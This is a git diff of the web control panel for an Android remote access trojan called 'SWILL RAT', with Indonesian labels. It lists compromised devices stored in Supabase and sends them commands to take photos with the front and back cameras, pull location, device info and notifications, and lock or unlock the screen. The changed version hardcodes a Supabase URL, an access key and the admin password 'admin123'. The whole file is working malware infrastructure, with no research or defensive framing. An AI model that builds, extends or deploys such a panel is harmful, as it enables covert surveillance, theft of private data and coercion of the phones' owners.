@@ -2,237 +2,102 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SWILL RAT Panel</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { 
-            font-family: 'Segoe UI', 'Roboto', monospace; 
-            background: #0a0a0a; 
-            color: #00ff00; 
-            padding: 16px; 
-            min-height: 100vh;
-        }
-        .container { max-width: 600px; margin: 0 auto; }
-        .login-container, .panel { 
-            background: #1a1a1a; 
-            border: 2px solid #00ff00; 
-            border-radius: 16px; 
-            padding: 24px 20px; 
-            margin: 20px 0; 
-            box-shadow: 0 0 20px rgba(0,255,0,0.2);
-        }
-        h2 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; letter-spacing: 2px; }
-        h3 { font-size: 1.2rem; margin: 15px 0 10px; }
-        input, button, select, textarea { 
-            background: #000; 
-            border: 1px solid #00ff00; 
-            border-radius: 12px;
-            color: #00ff00; 
-            padding: 14px 16px; 
-            margin: 8px 0; 
-            font-family: monospace;
-            font-size: 1rem;
-            width: 100%;
-            outline: none;
-        }
-        button { 
-            cursor: pointer; 
-            font-weight: bold;
-            transition: all 0.2s;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .container { max-width: 1400px; margin: auto; }
+        .login-container, .panel { background: #1a1a1a; border: 1px solid #00ff00; padding: 20px; margin: 20px 0; }
+        input, button, select, textarea { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 5px; font-family: monospace; }
+        button { cursor: pointer; }
         button:hover { background: #00ff00; color: #000; }
-        .device-card { 
-            background: #0f0f0f;
-            border: 1px solid #00ff00; 
-            border-radius: 12px;
-            padding: 14px; 
-            margin: 10px 0; 
-        }
-        .device-card strong { font-size: 1.1rem; display: block; margin-bottom: 8px; }
-        .device-card button { 
-            width: auto; 
-            padding: 8px 16px; 
-            margin-top: 10px; 
-            background: #1a1a1a;
-        }
-        .result-area { 
-            background: #000; 
-            border-radius: 12px;
-            padding: 14px; 
-            margin-top: 16px; 
-            white-space: pre-wrap; 
-            word-break: break-all;
-            max-height: 400px;
-            overflow-y: auto;
-            font-size: 0.85rem;
-        }
+        .device-card { border: 1px solid #00ff00; padding: 10px; margin: 10px 0; }
+        .result-area { background: #000; padding: 10px; margin-top: 10px; white-space: pre-wrap; }
+        .map { height: 300px; width: 100%; background: #333; margin-top: 10px; }
         .hidden { display: none; }
-        .status-badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: bold;
-        }
-        .locked-yes { background: #ff0000; color: #fff; }
-        .locked-no { background: #008800; color: #fff; }
-        select { appearance: none; background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2300ff00' stroke-width='2'><polyline points='6 9 12 15 18 9'/></svg>"); background-repeat: no-repeat; background-position: right 16px center; }
-        @media (max-width: 480px) {
-            body { padding: 12px; }
-            .login-container, .panel { padding: 18px 16px; }
-            h2 { font-size: 1.3rem; }
-            input, button, select { padding: 12px 14px; font-size: 0.9rem; }
-        }
-        .error-msg { color: #ff4444; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
 <div class="container" id="app">
     <div id="loginPanel" class="login-container">
-        <h2>🔐 SWILL RAT</h2>
-        <input type="password" id="password" placeholder="Password" autocomplete="off">
-        <button onclick="login()">⏎ Login</button>
-        <div id="loginError" class="error-msg"></div>
+        <h2>SWILL RAT - Admin Login</h2>
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
     </div>
     
     <div id="adminPanel" class="panel hidden">
-        <h2>🎮 SWILL CONTROL</h2>
+        <h2>SWILL RAT Control Panel</h2>
         <div id="devicesList"></div>
         <div id="commandPanel">
-            <h3>📡 Kirim Perintah</h3>
-            <select id="deviceSelect">
-                <option value="">-- Pilih Device --</option>
-            </select>
+            <h3>Kirim Perintah</h3>
+            <select id="deviceSelect"></select>
             <select id="commandSelect">
-                <option value="capture_front_cam">📷 Front Camera</option>
-                <option value="capture_back_cam">📸 Back Camera</option>
-                <option value="get_location">📍 Get Location</option>
-                <option value="get_device_info">📱 Device Info</option>
-                <option value="show_lockdown">🔒 Lock Screen</option>
-                <option value="hide_lockdown">🔓 Unlock Screen</option>
-                <option value="get_notifications">🔔 Get Notifications</option>
+                <option value="capture_front_cam">Front Camera</option>
+                <option value="capture_back_cam">Back Camera</option>
+                <option value="get_location">Get Location</option>
+                <option value="get_device_info">Device Info</option>
+                <option value="show_lockdown">Lock Screen</option>
+                <option value="hide_lockdown">Unlock Screen</option>
+                <option value="get_notifications">Get Notifications</option>
             </select>
-            <button onclick="sendCommand()">⚡ EXECUTE</button>
+            <button onclick="sendCommand()">Execute</button>
         </div>
-        <div id="results" class="result-area">
-            <span style="color:#555">Menunggu hasil...</span>
-        </div>
+        <div id="results" class="result-area"></div>
     </div>
 </div>
 
 <script>
-    // ========== AMAN UNTUK GITHUB ==========
-    // Semua credentials diambil dari environment variables Vercel
-    // Tidak ada hardcode credentials di file ini
+    const SUPABASE_URL = "https://ggiozjfdnplutuonzvzk.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdnaW96amZkbnBsdXR1b256dnprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODExOTc4ODQsImV4cCI6MjA5Njc3Mzg4NH0.7jcsxQ4Bxl9WI5Y6b4Q9YRd9LoQbmlXxDd-itqVtc8Y";
+    const ADMIN_PASSWORD = "admin123";
     
-    let supabase = null;
+    let supabase;
     let currentDeviceId = null;
-    let devicesRefreshInterval = null;
-    let resultsRefreshInterval = null;
     
-    // Fungsi untuk mendapatkan config dari berbagai sumber
-    function getConfig() {
-        // Priority: window.__ENV (Vercel) > window.env (fallback) > placeholder
-        const supabaseUrl = 
-            (typeof window.__ENV !== 'undefined' && window.__ENV.SUPABASE_URL) ||
-            (typeof window.env !== 'undefined' && window.env.SUPABASE_URL) ||
-            null;
-        
-        const supabaseKey = 
-            (typeof window.__ENV !== 'undefined' && window.__ENV.SUPABASE_ANON_KEY) ||
-            (typeof window.env !== 'undefined' && window.env.SUPABASE_ANON_KEY) ||
-            null;
-        
-        // Password dari environment variable Vercel (wajib di set)
-        const adminPassword = 
-            (typeof window.__ENV !== 'undefined' && window.__ENV.ADMIN_PASSWORD) ||
-            (typeof window.env !== 'undefined' && window.env.ADMIN_PASSWORD) ||
-            null;
-        
-        return { supabaseUrl, supabaseKey, adminPassword };
-    }
-    
-    async function login() {
+    function login() {
         const pwd = document.getElementById('password').value;
-        const errorDiv = document.getElementById('loginError');
-        errorDiv.innerHTML = '';
-        
-        const config = getConfig();
-        
-        // Cek apakah environment variables sudah di set di Vercel
-        if (!config.supabaseUrl || !config.supabaseKey) {
-            errorDiv.innerHTML = '❌ Konfigurasi Supabase tidak ditemukan. Pastikan environment variables SUPABASE_URL dan SUPABASE_ANON_KEY sudah di set di Vercel.';
-            return;
+        if (pwd === ADMIN_PASSWORD) {
+            document.getElementById('loginPanel').classList.add('hidden');
+            document.getElementById('adminPanel').classList.remove('hidden');
+            initSupabase();
+            loadDevices();
+            setInterval(loadDevices, 5000);
+            setInterval(checkResults, 3000);
+        } else {
+            alert("Wrong password");
         }
-        
-        if (!config.adminPassword) {
-            errorDiv.innerHTML = '❌ Konfigurasi password tidak ditemukan. Pastikan environment variable ADMIN_PASSWORD sudah di set di Vercel.';
-            return;
-        }
-        
-        if (pwd !== config.adminPassword) {
-            errorDiv.innerHTML = '❌ Password salah';
-            return;
-        }
-        
-        // Password benar
-        document.getElementById('loginPanel').classList.add('hidden');
-        document.getElementById('adminPanel').classList.remove('hidden');
-        
-        initSupabase(config.supabaseUrl, config.supabaseKey);
-        await loadDevices();
-        
-        if (devicesRefreshInterval) clearInterval(devicesRefreshInterval);
-        if (resultsRefreshInterval) clearInterval(resultsRefreshInterval);
-        devicesRefreshInterval = setInterval(loadDevices, 5000);
-        resultsRefreshInterval = setInterval(checkResults, 3000);
     }
     
-    function initSupabase(url, key) {
-        supabase = window.supabase.createClient(url, key);
+    function initSupabase() {
+        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
     }
     
     async function loadDevices() {
-        if (!supabase) return;
-        
-        const { data, error } = await supabase
-            .from('devices')
-            .select('*')
-            .order('last_seen', { ascending: false });
-        
-        if (error) {
-            console.error('Load devices error:', error);
-            return;
-        }
+        const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
+        if (error) return;
         
         const devicesDiv = document.getElementById('devicesList');
         const deviceSelect = document.getElementById('deviceSelect');
         
-        if (!data || data.length === 0) {
-            devicesDiv.innerHTML = '<div class="device-card" style="color:#888">🔌 Belum ada device terhubung</div>';
-            deviceSelect.innerHTML = '<option value="">-- Tidak ada device --</option>';
-            return;
-        }
-        
         devicesDiv.innerHTML = data.map(d => `
             <div class="device-card">
-                <strong>📱 ${d.device_name || 'Unknown'}</strong>
-                <div>🤖 Android: ${d.android_version || '-'}</div>
-                <div>🕒 Last Seen: ${new Date(d.last_seen).toLocaleString()}</div>
-                <div>🔒 Locked: <span class="status-badge ${d.is_locked ? 'locked-yes' : 'locked-no'}">${d.is_locked ? 'ACTIVE' : 'OFF'}</span></div>
-                <button onclick="selectDevice('${d.id}')">🎯 Select</button>
+                <strong>${d.device_name}</strong><br>
+                Android: ${d.android_version}<br>
+                Last Seen: ${d.last_seen}<br>
+                Locked: ${d.is_locked ? 'YES' : 'NO'}<br>
+                <button onclick="selectDevice('${d.id}')">Select</button>
             </div>
         `).join('');
         
-        deviceSelect.innerHTML = '<option value="">-- Pilih Device --</option>' + 
-            data.map(d => `<option value="${d.id}">${d.device_name || d.id.slice(0,8)}</option>`).join('');
+        deviceSelect.innerHTML = '<option value="">Select Device</option>' + 
+            data.map(d => `<option value="${d.id}">${d.device_name}</option>`).join('');
     }
     
     function selectDevice(id) {
         currentDeviceId = id;
-        alert('✅ Device selected');
+        alert(`Device selected: ${id}`);
     }
     
     async function sendCommand() {
@@ -240,11 +105,11 @@
         const command = document.getElementById('commandSelect').value;
         
         if (!deviceId) {
-            alert('⚠️ Pilih device terlebih dahulu');
+            alert("Select device first");
             return;
         }
         
-        const { error } = await supabase.from('commands').insert({
+        const { data, error } = await supabase.from('commands').insert({
             device_id: deviceId,
             command: command,
             status: 'pending',
@@ -252,17 +117,14 @@
         });
         
         if (error) {
-            alert('❌ Error: ' + error.message);
+            alert("Error: " + error.message);
         } else {
-            alert('✅ Command terkirim');
+            alert("Command sent");
         }
     }
     
     async function checkResults() {
-        if (!supabase) return;
-        
-        const { data, error } = await supabase
-            .from('commands')
+        const { data, error } = await supabase.from('commands')
             .select('*')
             .eq('status', 'done')
             .order('executed_at', { ascending: false })
@@ -271,22 +133,12 @@
         if (error) return;
         
         const resultsDiv = document.getElementById('results');
-        if (!data || data.length === 0) {
-            resultsDiv.innerHTML = '<span style="color:#555">✨ Belum ada hasil command</span>';
-            return;
-        }
-        
         resultsDiv.innerHTML = data.map(cmd => `
-            <div style="border-bottom:1px solid #00ff00; margin:10px 0; padding-bottom:10px;">
-                <strong>⚙️ ${cmd.command}</strong> <span style="color:#aaa; font-size:0.7rem;">${(cmd.device_id || '').slice(0,8)}</span><br>
-                📦 Result: <pre style="margin-top:6px; background:#111; padding:8px; border-radius:8px; overflow-x:auto; font-size:0.75rem;">${JSON.stringify(cmd.result, null, 2)}</pre>
+            <div style="border-bottom:1px solid #00ff00; margin:5px 0;">
+                <strong>${cmd.command}</strong> | ${cmd.device_id}<br>
+                Result: ${JSON.stringify(cmd.result, null, 2)}
             </div>
         `).join('');
-    }
-    
-    // Inisialisasi window.__ENV (akan diisi oleh Vercel saat build)
-    if (typeof window.__ENV === 'undefined') {
-        window.__ENV = {};
     }
 </script>
 </body>
